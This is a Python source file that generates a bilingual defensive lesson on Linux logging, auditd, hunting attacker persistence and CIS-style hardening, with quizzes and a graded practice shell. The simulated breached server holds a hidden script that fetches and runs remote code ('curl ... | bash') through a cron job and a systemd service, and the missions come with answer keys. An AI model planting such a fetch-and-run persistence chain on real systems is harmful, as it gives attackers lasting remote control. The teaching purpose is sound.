{analogy("<p>journald is the building's CCTV recorder, rsyslog prints the daily visitor register in plain text, and auditd is the extra camera you point at the safe. A smart burglar tries to wipe the register, which is why a copy must leave the building.</p>")}''',
    hi="Ubuntu mein journald (journalctl se padho), rsyslog (/var/log/auth.log, syslog jaise text files) aur optional auditd (audit.log) hote hain. last se logins aur reboots, sudo lastb se failed logins. SSH aur sudo ke liye auth.log sabse pehle dekho."))

  S.append(dict(id="journalctl", h="Reading logs fast with journalctl and grep", hi_h="journalctl aur grep se logs padhna",
    body=f'''{code(["$ journalctl -u ssh --since \"1 hour ago\"", "$ journalctl -p err -b", "$ journalctl -f", "$ journalctl _UID=1001 --since today", "$ journalctl -u cron -n 20 --no-pager", "$ sudo grep -E 'Accepted|Failed' /var/log/auth.log | tail -20", "$ sudo grep 'sudo:' /var/log/auth.log | grep COMMAND", "$ last -a | head", "$ sudo lastb | head"], "Log commands")}
<ul><li><code>-u</code> filters by unit, <code>--since</code> and <code>--until</code> by time (<code>"2026-11-20 08:00"</code> or <code>"1 hour ago"</code>), <code>-p err</code> by priority, <code>-b</code> by boot, and <code>-f</code> follows new lines live like <code>tail -f</code>.</li>
<li><code>-g pattern</code> (or <code>--grep</code>) searches message text, and <code>-o json</code> gives machine readable output for scripts.</li>
<li>Normal users see only their own journal entries unless they are in the <code>adm</code> or <code>systemd-journal</code> group, which is why investigations use <code>sudo</code>.</li></ul>
<p>Read a successful login line carefully, because each field answers a question:</p>
{code(["Nov 20 08:31:07 cwm-lab sshd[944]: Accepted password for backup_svc from 203.0.113.45 port 41377 ssh2"], "An auth.log line", False)}
<p>When, on which host, which program and process ID, <strong>how</strong> they authenticated (password, not a key), <strong>which account</strong>, <strong>from which IP</strong>. A service account logging in with a password from an internet address that just spent ten minutes failing as root is the moment an investigation starts.</p>
{attack("<p>After getting in, attackers commonly try to erase their tracks: deleting or truncating <code>auth.log</code>, clearing shell history, or stopping logging services (MITRE ATT&amp;CK T1070.002, clearing Linux logs). They can only erase what is on the machine they control.</p>")}
{defend("<p>Forward logs off the box in real time so deleted local copies do not matter. With rsyslog a single line such as <code>*.* @@logserver.lab:514</code> in a file under <code>/etc/rsyslog.d/</code> sends everything over TCP (one <code>@</code> means UDP); production setups add TLS. Tools like Wazuh or the Elastic stack collect, store and alert on these logs, and you will build one in stage 5.</p>")}''',
    hi="journalctl -u ssh (unit), --since \"1 hour ago\" (time), -p err (errors), -b (is boot), -f (live). auth.log ki line padho: kab, kaun sa program, password ya key, kaun sa account, kis IP se. Attacker logs delete karte hain, isliye logs ko turant doosre server pe forward karo (rsyslog @@server:514)."))

  S.append(dict(id="auditd", h="auditd: recording exactly who touched what", hi_h="auditd: kisne kya chhua",
    body=f'''<p>Normal logs tell you that someone logged in. The Linux audit system tells you that <em>user 1001, through sudo, ran sed on /etc/passwd at 08:34:02</em>. You decide what to watch with rules:</p>
{code(["$ sudo apt install -y auditd", "$ sudo nano /etc/audit/rules.d/cwm.rules", "-w /etc/passwd -p wa -k identity", "-w /etc/shadow -p wa -k identity", "-w /etc/sudoers -p wa -k sudoers", "-w /etc/ssh/sshd_config -p wa -k sshd", "-w /etc/crontab -p wa -k cron", "$ sudo augenrules --load", "$ sudo auditctl -l", "$ sudo ausearch -k identity -i", "$ sudo aureport --summary"], "auditd rules")}
<ul><li><code>-w path</code> watches a file or folder, <code>-p wa</code> records writes and attribute changes (add <code>r</code> for reads, <code>x</code> for executes), and <code>-k</code> attaches a key name you can search for.</li>
<li>Rule files in <code>/etc/audit/rules.d/</code> are merged and loaded by <code>augenrules --load</code> and at boot; <code>auditctl -l</code> lists what is active.</li>
<li><code>ausearch -i</code> turns numeric IDs into names. The <strong>auid</strong> field (audit user ID) is the account that originally logged in, and it stays the same after <code>sudo</code>, so you can see who really became root.</li>
<li>Adding <code>-e 2</code> as the last rule makes the configuration immutable until reboot, so an attacker with root cannot quietly switch auditing off without a reboot that itself gets noticed.</li></ul>
{defend("<p>Start small. Watching the identity files, sudoers, SSH config, cron and systemd unit folders gives high value with little noise. Watching every syscall on a busy server produces gigabytes nobody reads.</p>")}''',
    hi="auditd batata hai kis user ne kis file ko kab badla. Rules: -w /etc/passwd -p wa -k identity (watch, write/attribute, key). augenrules --load se load, auditctl -l se list, ausearch -k identity -i se search. auid asli login user dikhata hai, sudo ke baad bhi. -e 2 rules ko reboot tak lock kar deta hai."))

  S.append(dict(id="persistence-hunt", h="Hunting persistence: a repeatable checklist", hi_h="Persistence dhoondhna: checklist",
    body=f'''<p>Once attackers get in, they make sure they can come back after a reboot or a password change. On Linux the same handful of places cover most cases, and each one has a MITRE ATT&amp;CK technique ID that defenders and reports use:</p>
{fig(PERSIST, "Where attackers hide a way back in, labelled with their MITRE ATT&amp;CK technique IDs. A hunt checks every one of these spots, for every user.", "Linux persistence map")}
{code(["# 1. scheduled jobs, every user", "$ for u in $(cut -d: -f1 /etc/passwd); do sudo crontab -l -u \"$u\" 2>/dev/null | sed \"s/^/$u: /\"; done", "$ ls -la /etc/cron.d /etc/cron.daily /var/spool/cron/crontabs 2>/dev/null", "$ systemctl list-timers --all", "# 2. services", "$ systemctl list-unit-files --type=service --state=enabled", "$ ls -lt /etc/systemd/system/ | head", "# 3. SSH keys for every account", "$ sudo find / -name authorized_keys -path '*/.ssh/*' 2>/dev/null -exec ls -l {} \\;", "# 4. accounts with UID 0 or a new login shell", "$ awk -F: '$3==0 || $7 ~ /bash|sh$/' /etc/passwd", "# 5. shell startup files changed recently", "$ sudo find /home /root -maxdepth 2 -name '.*rc' -mtime -7 -ls"], "Persistence hunt")}
<p>What makes something suspicious is rarely its name. Attackers pick names like <code>sysupdate</code>, <code>dbus-helper</code> or <code>.cache</code>. Look instead for <strong>things that do not fit</strong>: a service running a file from <code>/tmp</code> or a hidden folder, a cron job for an account that should never log in, a key in <code>authorized_keys</code> that nobody recognises, files changed on the day of the suspicious login.</p>
{attack("<p>A typical chain on an internet facing server: brute force a weak password on a service account, add an SSH key for quiet access, then install a cron job or systemd service that restarts a crypto miner or backdoor from a hidden folder. Exactly the scenario in the practice shell below.</p>")}
{defend("<p>Keep a baseline from a clean machine (enabled services, cron tables, SUID files, authorized_keys hashes) and compare against it. The difference is your list of leads. Before removing anything, <strong>collect evidence</strong>: copy the files and record hashes, because deleting first destroys what you need for the report.</p>")}''',
    hi="Attacker wapas aane ka raasta banate hain: cron/timer, systemd service, authorized_keys mein key, .bashrc, ya naya UID 0 user. Naam pe mat jao (sysupdate jaisa naam normal lagta hai); dekho kya fit nahi hota: /tmp se chalne wali service, service account ka cron, anjaan SSH key. Hatane se pehle evidence copy karo."))

  S.append(dict(id="investigate", h="Practice: investigate a compromised server", hi_h="Practice: compromised server investigate karo",
    body=f'''<p>This practice server was brute forced on 20 November. Use the logs to find out how the attacker got in and what they left behind, then contain it. Use <code>sudo</code> where a file needs root; this is your own lab box.</p>
{terminal(dict(id="hunt", files={
    "/var/log/auth.log": {"c": "\n".join(HUNT_AUTH) + "\n", "m": "640", "o": "syslog", "g": "adm"},
    "/var/log/journal.txt": {"c": "\n".join(JOURNAL) + "\n", "m": "640", "g": "adm"},
    "/var/log/wtmp.txt": {"c": "\n".join(WTMP) + "\n", "m": "664", "g": "utmp"},
    "/var/log/audit": {"d": True, "m": "750"},
    "/var/log/audit/audit.log": {"c": "\n".join(AUDIT) + "\n", "m": "600"},
    "/etc/audit/rules.d/cwm.rules": {"c": "-w /etc/passwd -p wa -k identity\n-w /etc/shadow -p wa -k identity\n-w /home/backup_svc/.ssh -p wa -k sshkeys\n-w /etc/systemd/system -p wa -k systemd\n", "m": "640"},
    "/var/spool/cron/crontabs/backup_svc": {"c": "*/10 * * * * /tmp/.cache/.u >/dev/null 2>&1\n", "m": "600", "o": "backup_svc", "g": "crontab"},
    "/etc/systemd/system/sysupdate.service": {"c": "[Unit]\nDescription=System update helper\n\n[Service]\nExecStart=/tmp/.cache/.u\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n"},
    "/etc/systemd/system/multi-user.target.wants/sysupdate.service": {"c": "symlink to /etc/systemd/system/sysupdate.service"},
    "/home/backup_svc": {"d": True, "m": "700", "o": "backup_svc"},
    "/home/backup_svc/.ssh": {"d": True, "m": "700", "o": "backup_svc"},
    "/home/backup_svc/.ssh/authorized_keys": {"c": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK3xq0LwE5c4ZpXQe2s9Rz7m1Hj8dVb6YtUo4nPq2wQ9 op@vps-203\n", "m": "600", "o": "backup_svc"},
    "/tmp/.cache": {"d": True, "m": "755", "o": "backup_svc"},
    "/tmp/.cache/.u": {"c": "#!/bin/bash\n# keep miner alive\ncurl -s http://198.51.100.23/m | bash\n", "m": "755", "o": "backup_svc"}},
  missions=[
    dict(t="Start with the login history. Who logged in recently, and from where?", hint="last", c=dict(type="cmd", re=r"^last(\s+-\w+)*(\s*\|.*)?$")),
    dict(t="List every successful SSH login in <code>/var/log/auth.log</code>.", hint="sudo grep Accepted /var/log/auth.log", c=dict(type="cmd", re=r"^(sudo\s+)?grep\s+(-\w+\s+)*['\"]?Accepted['\"]?\s+/var/log/auth\.log$")),
    dict(t="Which account did the attacker's IP (the one that brute forced root) log in as? Type <code>answer NAME</code>.", hint="Find the Accepted line from 203.0.113.45.", c=dict(type="answer", v="backup_svc"), ok="A service account with a password reachable over SSH: the root cause."),
    dict(t="What did that account do with sudo? Search auth.log for its sudo lines.", hint="sudo grep 'sudo: backup_svc' /var/log/auth.log, or grep sudo and read", c=dict(type="cmd", re=r"^(sudo\s+)?grep\s+.*sudo.*\s+/var/log/auth\.log$")),
    dict(t="Read the service it enabled, without starting it.", hint="systemctl cat sysupdate", c=dict(type="cmd", re=r"^(sudo\s+)?systemctl\s+cat\s+sysupdate(\.service)?$"), ok="It runs a hidden file from /tmp and restarts forever: persistence."),
    dict(t="Check the attacker account's crontab too.", hint="sudo crontab -l -u backup_svc", c=dict(type="cmd", re=r"^sudo\s+crontab\s+(-l\s+-u\s+backup_svc|-u\s+backup_svc\s+-l)$")),
    dict(t="Look for an SSH key they planted for quiet access.", hint="sudo cat /home/backup_svc/.ssh/authorized_keys", c=dict(type="cmd", re=r"^sudo\s+(cat|ls\s+-\w+)\s+/home/backup_svc/\.ssh(/authorized_keys)?/?$")),
    dict(t="Confirm it with the audit trail: search auditd for the <code>sshkeys</code> key.", hint="sudo ausearch -k sshkeys", c=dict(type="cmd", re=r"^sudo\s+ausearch\s+(-i\s+)?-k\s+sshkeys(\s+-i)?$")),
    dict(t="Read the payload in <code>/tmp/.cache/.u</code>. Which IP does it fetch code from? Type <code>answer IP</code>.", hint="cat /tmp/.cache/.u", c=dict(type="answer", v="198.51.100.23")),
    dict(t="Contain it: stop the service now and stop it starting at boot.", hint="sudo systemctl disable --now sysupdate", c=dict(type="gone", path="/etc/systemd/system/multi-user.target.wants/sysupdate.service"), ok="Contained. On a real server you would also lock the account, remove the key and cron job after copying them as evidence, block the IPs and reset credentials.")],
  intro=["Incident practice shell. The server cwm-lab was brute forced. Work through the missions to reconstruct what happened."]), "Persistence hunt")}''',
    hi="Ye practice server brute force hua tha. last aur auth.log se pata karo kaun aaya aur kis account se, phir sudo ke commands, systemd service, cron, SSH key aur audit log se persistence dhoondho, payload ka IP nikaalo, aur service disable karke contain karo."))

  S.append(dict(id="hardening", h="Hardening: CIS style, then prove it", hi_h="Hardening: CIS style, phir proof",
    body=f'''<p>Hardening means removing the openings you just hunted through, and then <strong>proving</strong> it, not just believing it. The <strong>CIS Benchmarks</strong> from the Center for Internet Security are free, detailed hardening guides for each distribution, including Ubuntu 24.04 LTS, and most audit tools map their checks to them. Canonical's <strong>Ubuntu Security Guide</strong> (<code>usg</code>, part of Ubuntu Pro, free for personal use on a small number of machines) can audit and apply CIS profiles automatically, and the open source <strong>Lynis</strong> gives a quick audit with suggestions.</p>
{table(["Area", "Do this", "Check it with"], [
  ["Accounts", "Service accounts get <code>/usr/sbin/nologin</code>; lock unused accounts", "<code>awk -F: '$7 !~ /nologin|false/' /etc/passwd</code>"],
  ["SSH", "Keys only, no root login, only listed users (<code>AllowUsers</code>)", "<code>sudo sshd -T | grep -Ei 'passwordauth|permitroot|allowusers'</code>"],
  ["Brute force", "fail2ban bans IPs after repeated failures", "<code>sudo fail2ban-client status sshd</code>"],
  ["Updates", "<code>unattended-upgrades</code> installs security updates daily", "<code>systemctl status unattended-upgrades</code>"],
  ["Firewall", "Default deny incoming, allow only what is needed", "<code>sudo ufw status verbose</code>"],
  ["Services", "Disable what you do not use", "<code>systemctl list-unit-files --state=enabled</code>"],
  ["Temp folders", "Mount <code>/tmp</code> with <code>noexec,nosuid,nodev</code> where your software allows", "<code>findmnt /tmp</code>"],
  ["Logging", "Persistent journal, auditd rules, logs forwarded off box", "<code>ls /var/log/journal; sudo auditctl -l</code>"]], "Hardening checklist")}
{code(["$ sudo apt install -y lynis fail2ban", "$ sudo lynis audit system", "$ grep -E 'warning|suggestion' /var/log/lynis-report.dat | head -20", "$ sudo usermod -s /usr/sbin/nologin backup_svc", "$ sudo passwd -l backup_svc"], "Audit and fix")}
<p>Lynis prints a hardening index and a list of warnings and suggestions. Fix one area at a time, rerun the audit, and keep the reports: a rising score with a dated report is evidence you can show an auditor or an interviewer.</p>
{defend("<p>In the practice scenario three controls would each have stopped the attack: a service account with <code>nologin</code> (no interactive login at all), SSH with keys only (no passwords to guess), and fail2ban (the IP banned after a few failures). Defence in depth means you want all three, because one will eventually be misconfigured.</p>")}''',
    hi="CIS Benchmarks free hardening guides hain (Ubuntu 24.04 ke liye bhi). usg (Ubuntu Pro) aur Lynis audit karte hain. Service accounts ko nologin do, SSH sirf keys se, fail2ban, unattended-upgrades, ufw default deny, extra services band, logs forward. Har change ke baad dobara audit karke proof rakho."))

  return dict(
    slug="learn-linux-logging-auditing-hardening", stage=2, n="2.4", minutes=65, level="Intermediate",
    title="Linux Logging, Auditing and Hardening", short="journald, rsyslog and auditd, a persistence hunt on a hacked server, and CIS style hardening you can prove.",
    seo_title="Linux Logging, auditd and Hardening: journalctl, Persistence Hunt, CIS | CyberWithMadhav",
    desc="Free lesson: read Linux logs with journalctl and auth.log, record file changes with auditd, hunt cron, systemd and SSH key persistence on a hacked server, then harden with CIS checks.",
    kw="linux logging journalctl tutorial, auth.log ssh investigation, auditd rules example, linux persistence hunting cron systemd, authorized_keys backdoor, cis benchmark ubuntu hardening, lynis audit",
    kicker="$ lesson 2.4 --stage linux --blue-team", hi_title="Linux logging, auditing aur hardening",
    lead="Every intrusion leaves a trail, if the system was recording and someone knows where to look. Learn how Linux logs work, record exactly who changed what with auditd, investigate a hacked server step by step, and harden your own VM with checks you can prove.",
    hi_lead="Har intrusion ek trail chhodta hai, agar system record kar raha ho aur kisi ko pata ho kahan dekhna hai. Linux logging samjho, auditd se kisne kya badla record karo, hacked server step by step investigate karo, aur apna VM harden karke proof rakho.",
    goals=["Explain how journald, rsyslog and auditd fit together and where each writes", "Answer investigation questions with journalctl, auth.log, last and ausearch", "Write auditd rules for identity files, sudoers, SSH and cron", "Hunt cron, systemd, SSH key and account persistence with a repeatable checklist", "Harden a server against the same attack and prove it with Lynis or CIS checks"],
    sections=S,
    cards=[("Where are SSH logins logged on Ubuntu?", "/var/log/auth.log, and journalctl -u ssh."),
      ("Show errors from this boot?", "journalctl -p err -b"),
      ("What does auid show in audit logs?", "The account that originally logged in, even after sudo."),
      ("auditd rule to watch /etc/passwd writes?", "-w /etc/passwd -p wa -k identity"),
      ("Five persistence spots to check?", "Cron and timers, systemd services, authorized_keys, shell rc files, new UID 0 or login accounts."),
      ("Why forward logs off the server?", "An attacker with root can delete local logs, but not copies already on another server."),
      ("First step before deleting a backdoor?", "Collect evidence: copy the files and record their hashes."),
      ("Free hardening references?", "CIS Benchmarks, Ubuntu Security Guide (usg), Lynis.")],
    quiz=[("Which command shows only the SSH service's journal for the last hour?", ["journalctl -f", "journalctl -u ssh --since \"1 hour ago\"", "last -n 1", "cat /var/log/journal"], 1, "-u filters by unit and --since by time."),
      ("A log shows <code>Accepted password for backup_svc from 203.0.113.45</code>. What is most alarming?", ["The port number", "A service account logged in with a password from an internet IP", "The date format", "That it used ssh2"], 1, "Service accounts should not have interactive password logins, least of all from unknown IPs."),
      ("What does <code>-p wa</code> mean in an auditd watch rule?", ["Print all", "Record writes and attribute changes", "Watch apps", "Permit access"], 1, "r read, w write, x execute, a attribute change."),
      ("A service file runs <code>/tmp/.cache/.u</code> with <code>Restart=always</code>. Why suspicious?", ["Services never restart", "Legitimate services do not run hidden files from a world writable temp folder", "The name is too short", "It is not suspicious"], 1, "Location and behaviour give it away, not the name."),
      ("You found a backdoor key in authorized_keys. Best first action?", ["Delete it immediately and reboot", "Copy it and record hashes as evidence, then remove it and investigate how it got there", "Ignore it", "Post it online"], 1, "Evidence first, then containment and root cause."),
      ("Which control alone would have blocked the password brute force?", ["A longer banner", "SSH key only authentication (PasswordAuthentication no)", "A bigger disk", "Turning off the journal"], 1, "No passwords means nothing to guess. fail2ban and nologin also help.")],
    lab=dict(title="Lab: log, attack, detect and harden your own VM", time="60 minutes",
      needs="Your Ubuntu lab VM (snapshot first) and your own PC on the host-only network.",
      steps=[("Make the journal persistent and check rsyslog", code(["$ ls -ld /var/log/journal || sudo mkdir -p /var/log/journal && sudo systemctl restart systemd-journald", "$ journalctl --disk-usage", "$ systemctl status rsyslog --no-pager", "$ sudo tail -5 /var/log/auth.log"], "Logging") + "<p>Reboot, then confirm <code>journalctl -b -1</code> shows the previous boot.</p>"),
        ("Install auditd and add rules", code(["$ sudo apt install -y auditd", "$ sudo nano /etc/audit/rules.d/cwm.rules", "$ sudo augenrules --load && sudo auditctl -l"], "auditd") + "<p>Use the five rules from the auditd section, plus <code>-w /etc/systemd/system -p wa -k systemd</code>.</p>"),
        ("Simulate the attacker safely", code(["$ sudo useradd -m -s /bin/bash labsvc && sudo passwd labsvc", "$ echo '*/10 * * * * /bin/true' | sudo crontab -u labsvc -", "$ printf '[Service]\\nExecStart=/bin/sleep infinity\\n[Install]\\nWantedBy=multi-user.target\\n' | sudo tee /etc/systemd/system/labtest.service", "$ sudo systemctl enable --now labtest"], "Simulate") + "<p>These are harmless stand-ins (<code>/bin/true</code> and <code>sleep</code>) for a backdoor. From your PC, log in once as <code>labsvc</code> over SSH.</p>"),
        ("Hunt it with the checklist", "<p>Run every command from the persistence hunt section. Find the cron job, the service, the login in <code>auth.log</code> and <code>last</code>, and the audit events with <code>sudo ausearch -k systemd -i</code>. Write a five line incident note with times and evidence.</p>"),
        ("Clean up and harden", code(["$ sudo systemctl disable --now labtest && sudo rm /etc/systemd/system/labtest.service", "$ sudo crontab -r -u labsvc && sudo userdel -r labsvc", "$ sudo apt install -y lynis fail2ban unattended-upgrades", "$ sudo lynis audit system | tee ~/lynis-before.txt"], "Harden") + "<p>Fix three warnings or suggestions from Lynis, run it again into <code>~/lynis-after.txt</code>, and compare the hardening index.</p>")],
      verify="Your hunt found every planted item from its logs, the audit trail shows who created them, and your second Lynis report scores higher than the first."),
    takeaways=["journald, rsyslog and auditd each answer different questions; know where each writes.", "Forward logs off the box, because attackers delete local logs.",
      "auditd with a few focused rules shows who changed identity, sudo, SSH and cron files.", "Hunt persistence by behaviour and location, not by names.", "Harden, then prove it with an audit you can repeat."])
